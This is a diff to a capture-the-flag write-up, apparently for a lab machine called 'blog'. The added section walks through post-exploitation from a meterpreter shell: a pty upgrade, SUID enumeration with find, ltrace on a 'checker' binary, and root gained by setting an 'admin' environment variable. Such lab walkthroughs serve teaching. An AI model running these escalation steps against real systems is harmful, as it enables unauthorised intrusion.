@@ -254,6 +254,9 @@ run
 ```
 
 
+![](pics/b7.png)
+
+
 
 And we see its worked we have a meterpreter shell. Then we use this commands to get a normal shell:
 
@@ -266,3 +269,116 @@ shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash"'
 ```
+
+
+
+After that we are in as user www-data. When we go to the home directory and we see there is a user named bjoel and in bjoel directory there is user.txt but it doesn't give us a flag:
+
+
+
+```
+(Meterpreter 2)(/var/www/wordpress) > shell
+Process 6607 created.
+Channel 1 created.
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@blog:/var/www/wordpress$ cd /home
+cd /home
+www-data@blog:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root  root  4096 May 26  2020 .
+drwxr-xr-x 24 root  root  4096 May 25  2020 ..
+drwxr-xr-x  4 bjoel bjoel 4096 May 26  2020 bjoel
+www-data@blog:/home$ cd bjoel
+cd bjoel
+www-data@blog:/home/bjoel$ ls -la
+ls -la
+total 100
+drwxr-xr-x 4 bjoel bjoel  4096 May 26  2020 .
+drwxr-xr-x 3 root  root   4096 May 26  2020 ..
+lrwxrwxrwx 1 root  root      9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 bjoel bjoel   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bjoel bjoel  3771 Apr  4  2018 .bashrc
+drwx------ 2 bjoel bjoel  4096 May 25  2020 .cache
+drwx------ 3 bjoel bjoel  4096 May 25  2020 .gnupg
+-rw-r--r-- 1 bjoel bjoel   807 Apr  4  2018 .profile
+-rw-r--r-- 1 bjoel bjoel     0 May 25  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 bjoel bjoel 69106 May 26  2020 Billy_Joel_Termination_May20-2020.pdf
+-rw-r--r-- 1 bjoel bjoel    57 May 26  2020 user.txt
+www-data@blog:/home/bjoel$ cat user.txt
+cat user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+www-data@blog:/home/bjoel$
+```
+
+
+
+Then we use this command to see which files runs with root privileges:
+
+
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+
+
+And we see there is a file called checker:
+
+
+
+```
+www-data@blog:/home/bjoel$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+
+```
+
+
+When we use command "ltrace checker" to look what this file does we see this output:
+
+
+
+```
+www-data@blog:/home/bjoel$ ltrace checker
+ltrace checker
+getenv("admin")                                  = nil
+puts("Not an Admin"Not an Admin
+)                             = 13
++++ exited (status 0) +++
+
+```
+
+
+
+What this "checker" is doing is calling a getenv() on "admin" variable and returning its value i.e. "nil", because the "admin" environment  variable does not exist, so on running "checker" it's giving the output "Not an admin".So we can give admin variable any value to exploit the vulnerability of "checker" and get root privileges:
+
+
+
+```
+www-data@blog:/home/bjoel$ export admin=0
+export admin=0
+www-data@blog:/home/bjoel$ checker
+checker
+root@blog:/home/bjoel# whoami
+whoami
+root
+root@blog:/home/bjoel#
+```
+
+
+
+And done. We are root. Thanks for reading!
